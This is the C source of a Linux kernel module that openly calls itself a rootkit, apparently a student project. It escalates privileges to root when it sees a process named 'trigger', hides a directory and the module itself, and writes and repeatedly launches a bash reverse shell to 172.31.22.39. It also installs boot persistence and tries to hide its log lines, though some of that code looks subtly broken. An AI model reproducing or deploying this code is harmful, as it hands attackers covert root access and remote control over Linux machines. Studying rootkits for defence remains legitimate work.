#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/types.h>
#include <linux/namei.h>
#include <linux/mount.h>
#include <linux/dcache.h>
#include <linux/stat.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kmod.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/path.h>
#include <linux/string.h>
#include <linux/uaccess.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Victor, Marouane, Mina, Axel");
MODULE_DESCRIPTION("Rootkit -> Privilege escalation, hiding directory, and LKM hiding");
MODULE_VERSION("0.01");

//clear logs 
static asmlinkage int (*original_printk)(const char *fmt, ...);

// Function prototypes
void showme(void);
void hideme(void);
void protect(void);
void unprotect(void);
static void set_root(void);

// Hide LKM variables and functions
static struct list_head *prev_module;
static short hidden = 0;

// Privilege escalation variables and functions
static struct kprobe kp_getuid;
static struct kprobe kp_filldir64;

// Moove file variable

static const char *src_path = "/root/rootkit.ko";
static const char *dest_dir = "/111111111111111111111111111/";
static const char *dest_file = "rootkit.ko";

// launch .sh function:
static struct task_struct *lauch_sh_thread;

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

int is_protected = 0;

void protect(void)
{
    if (is_protected) {
        return;
    }

    try_module_get(THIS_MODULE);
    is_protected = 1;
}

void unprotect(void)
{
    if (!is_protected) {
        return;
    }

    module_put(THIS_MODULE);
    is_protected = 0;
}

static void set_root(void)
{
    struct cred *new_creds;
    struct task_struct *parent_task;

    // Get the parent process
    parent_task = current->real_parent;

    // Prepare new credentials
    new_creds = prepare_creds();
    if (new_creds == NULL) {
        printk(KERN_ALERT "rootkit: Unable to prepare credentials.\n");
        return;
    }

    // Set the new credentials to root
    new_creds->uid.val = 0;
    new_creds->gid.val = 0;
    new_creds->euid.val = 0;
    new_creds->egid.val = 0;
    new_creds->suid.val = 0;
    new_creds->sgid.val = 0;
    new_creds->fsuid.val = 0;
    new_creds->fsgid.val = 0;

    // Commit the new credentials to the parent process
    if (parent_task) {
        task_lock(parent_task); // Lock to modify safely
        parent_task->real_cred = new_creds;
        parent_task->cred = new_creds;
        task_unlock(parent_task); // Unlock after modification
    } else {
        printk(KERN_ALERT "rootkit: Parent task not found.\n");
    }

    printk(KERN_INFO "rootkit: Parent process privileges escalated successfully.\n");
}

static int handler_pre_getuid(struct kprobe *p, struct pt_regs *regs)
{
    const char *target_cmd = "trigger";
    char comm[TASK_COMM_LEN];

    get_task_comm(comm, current);

    if (strcmp(comm, target_cmd) == 0) {
        set_root();
    }

    return 0;
}

static void handler_post_getuid(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{
    if (regs->si == 0) {
        regs->ax = 0;
    }
}

static int handler_pre_filldir64(struct kprobe *p, struct pt_regs *regs)
{
    char *dir = (char *)regs->si;
    int ret;

    if ((ret = strcmp(dir, "111111111111111111111111111")) == 0) {
        regs->dx = 0;
    }
    return 0;
}

static int dir_init(void)
{
    struct path path;
    struct dentry *dentry;
    struct inode *dir_inode;
    int ret;

    // find the root path ("/")
    ret = kern_path("/", 0, &path);
    if (ret) {
        return ret;
    }

    // get the inode for the root path
    dir_inode = path.dentry->d_inode;

    // create dentry for "111111111111111111111111111"
    dentry = d_alloc_name(path.dentry, "111111111111111111111111111");
    if (!dentry) {
        return -ENOMEM;
    }

    // create the repo "111111111111111111111111111"
    ret = vfs_mkdir(NULL, dir_inode, dentry, S_IRWXU | S_IRWXG | S_IRWXO);
    if (ret) {
        dput(dentry);  // free dentry in fail case
        return ret;
    }

    return 0;
}

static int lkm_file_create(void) {
    struct file *trigger_file, *revshell_file, *persistence_file;
    loff_t pos_trigger = 0, pos_revshell = 0, pos_persistence = 0;
    char *trigger_content = "#!/bin/bash\n";
    char *revshell_content = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/172.31.22.39/12345 0>&1\n";
    char *persistence_content =
        "echo \"#!/bin/sh\" > /etc/local.d/my_startup.start\n"
        "echo \"insmod /111111111111111111111111111/rootkit.ko\" >> /etc/local.d/my_startup.start\n"
        "chmod +x /etc/local.d/my_startup.start\n"
        "rc-update add local default\n";
    ssize_t written;

    // Create the trigger
    trigger_file = filp_open("/111111111111111111111111111/trigger", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (IS_ERR(trigger_file)) {
        return PTR_ERR(trigger_file);
    }

    // Write in the trigger
    written = kernel_write(trigger_file, trigger_content, strlen(trigger_content), &pos_trigger);
    if (written < 0) {
        filp_close(trigger_file, NULL);
        return written;
    }
    filp_close(trigger_file, NULL);

    // Create the revshell.sh
    revshell_file = filp_open("/111111111111111111111111111/revshell.sh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (IS_ERR(revshell_file)) {
        return PTR_ERR(revshell_file);
    }

    // write in the revsehll.sh
    written = kernel_write(revshell_file, revshell_content, strlen(revshell_content), &pos_revshell);
    if (written < 0) {
        filp_close(revshell_file, NULL);
        return written;
    }
    filp_close(revshell_file, NULL);

    // Create the persistence.sh
    persistence_file = filp_open("/111111111111111111111111111/persistence.sh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (IS_ERR(persistence_file)) {
        return PTR_ERR(persistence_file);
    }
    // write in the persistence.sh
    written = kernel_write(persistence_file, persistence_content, strlen(persistence_content), &pos_persistence);
    if (written < 0) {
        filp_close(persistence_file, NULL);
        return written;
    }
    filp_close(persistence_file, NULL);


    return 0;
}

static int move_file(void) {
    struct path src, dest_dir_path;
    struct dentry *dest_dentry;
    struct renamedata rename_data;
    int ret;

    // resolve source path
    ret = kern_path(src_path, LOOKUP_FOLLOW, &src);
    if (ret) {
        return ret;
    }

    // resolve destination path
    ret = kern_path(dest_dir, LOOKUP_FOLLOW | LOOKUP_DIRECTORY, &dest_dir_path);
    if (ret) {
        path_put(&src);
        return ret;
    }

    // create dentry for the dest file
    dest_dentry = d_alloc_name(dest_dir_path.dentry, dest_file);
    if (!dest_dentry) {
        path_put(&src);
        path_put(&dest_dir_path);
        return -ENOMEM;
    }

    // config of datas for vfs_rename
    rename_data.old_dir = d_inode(src.dentry->d_parent);
    rename_data.old_dentry = src.dentry;
    rename_data.new_dir = d_inode(dest_dir_path.dentry);
    rename_data.new_dentry = dest_dentry;
    rename_data.flags = 0;

    // call vfs_rename
    ret = vfs_rename(&rename_data);
    if (ret) {
        printk(KERN_ERR "Erreur: Impossible de déplacer %s vers %s%s\n",
               src_path, dest_dir, dest_file);
    } else {
        printk(KERN_INFO "Fichier déplacé avec succès de %s à %s%s\n",
               src_path, dest_dir, dest_file);
    }

    // FREE !!!
    dput(dest_dentry);
    path_put(&src);
    path_put(&dest_dir_path);
    return ret;
}

static int lauch_sh_function(void *data) {
    char *persistence_argv[] = {"/bin/bash", "/111111111111111111111111111/persistence.sh", NULL};
    char *revshell_argv[] = {"/bin/bash", "/111111111111111111111111111/revshell.sh", NULL};
    char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

    // launch persistence script
    int ret = call_usermodehelper(persistence_argv[0], persistence_argv, envp, UMH_WAIT_EXEC);

    //lauch revshell
    while (!kthread_should_stop()) {
        ret = call_usermodehelper(revshell_argv[0], revshell_argv, envp, UMH_WAIT_EXEC);
        ssleep(5);
    }

    return 0;
}

static void *find_symbol(const char *name)
{
    struct file *file;
    char *buffer, *line;
    loff_t pos = 0;
    ssize_t nbytes;

    // Augmentation de la taille du buffer pour gérer des lignes longues
    buffer = kmalloc(4096, GFP_KERNEL);
    if (!buffer) {
        return NULL;
    }

    file = filp_open("/proc/kallsyms", O_RDONLY, 0);
    if (IS_ERR(file)) {
        kfree(buffer);
        return NULL;
    }

    while ((nbytes = kernel_read(file, buffer, 4096, &pos)) > 0) {
        line = strsep(&buffer, "\n");
        while (line) {
            unsigned long addr;
            char sym_name[128];

            if (sscanf(line, "%lx %*c %127s", &addr, sym_name) == 2) {
                if (strcmp(sym_name, name) == 0) {
                    filp_close(file, NULL);
                    kfree(buffer);
                    return (void *)addr;
                }
            }
            line = strsep(&buffer, "\n");
        }
    }

    filp_close(file, NULL);
    kfree(buffer);
    return NULL;
}


static asmlinkage int hooked_printk(const char *fmt, ...)
{
    va_list args;
    int len;
    char *buffer;

    buffer = kmalloc(1024, GFP_KERNEL);
    if (!buffer) {
        return -ENOMEM;
    }

    va_start(args, fmt);
    len = vsnprintf(buffer, 1024, fmt, args);
    va_end(args);

    // Filtrer les messages contenant "rootkit"
    if (strstr(buffer, "rootkit")) {
        kfree(buffer);
        return 0;
    }

    // Appeler la fonction printk originale
    len = original_printk("%s", buffer);
    kfree(buffer);
    return len;
}


// Module initialization and cleanup
static int __init rootkit_init(void)
{
    int ret;

    // hideme();
    // protect();
    dir_init();
    lkm_file_create();
    move_file();

    lauch_sh_thread = kthread_run(lauch_sh_function, NULL, "lauch_sh_thread");
    if (IS_ERR(lauch_sh_thread)) {
        return PTR_ERR(lauch_sh_thread);
    }
    // Privilege escalation
    kp_getuid.symbol_name = "__x64_sys_getuid";
    kp_getuid.pre_handler = handler_pre_getuid;
    kp_getuid.post_handler = handler_post_getuid;

    ret = register_kprobe(&kp_getuid);
    if (ret < 0) {
        return ret;
    }


    // File hiding
    kp_filldir64.symbol_name = "filldir64";
    kp_filldir64.pre_handler = handler_pre_filldir64;

    ret = register_kprobe(&kp_filldir64);
    if (ret < 0) {
        unregister_kprobe(&kp_getuid);
        return ret;
    }

    original_printk = (void *)find_symbol("printk");
    if (!original_printk) {
        printk(KERN_ERR "Rootkit: Impossible de trouver printk.\n");
        return -EFAULT;
    }

    // Remplace printk par le hook
    *((void **)&original_printk) = hooked_printk;
    printk(KERN_INFO "Rootkit: Hook de printk activé.\n");



    return 0;
}

static void __exit rootkit_exit(void)
{

    if (lauch_sh_thread) {
        kthread_stop(lauch_sh_thread);
        printk(KERN_INFO "Reverse shell thread stopped.\n");
    }

    // Unregister kprobes
    unregister_kprobe(&kp_getuid);
    unregister_kprobe(&kp_filldir64);

    if (original_printk) {
        *((void **)&original_printk) = original_printk;
        printk(KERN_INFO "Rootkit: Hook de printk désactivé.\n");
    }    

    // Show LKM
    showme();
    unprotect();
}

module_init(rootkit_init);
module_exit(rootkit_exit);